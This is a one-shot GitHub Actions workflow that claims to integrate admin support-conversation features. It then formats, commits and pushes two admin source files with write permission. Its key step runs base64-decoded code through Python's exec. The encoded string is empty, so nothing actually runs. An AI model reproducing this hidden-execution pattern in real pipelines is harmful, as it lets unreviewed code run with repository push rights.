name: One-shot admin support conversation integration

on:
  push:
    branches: [main]
    paths:
      - .github/workflows/admin-support-conversations.yml

permissions:
  contents: write

jobs:
  integrate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - name: Integrate admin support conversations
        run: python -c "import base64;exec(base64.b64decode(''))"
      - name: Format and commit changes
        run: |
          npx prettier@3.9.6 src/routes/admin.tsx src/components/AdminSupportPanel.tsx --write
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add src/routes/admin.tsx src/components/AdminSupportPanel.tsx
          if git diff --cached --quiet; then
            echo "No changes required"
            exit 0
          fi
          git commit -m "feat(admin): manage support conversations and internal notes"
          git push
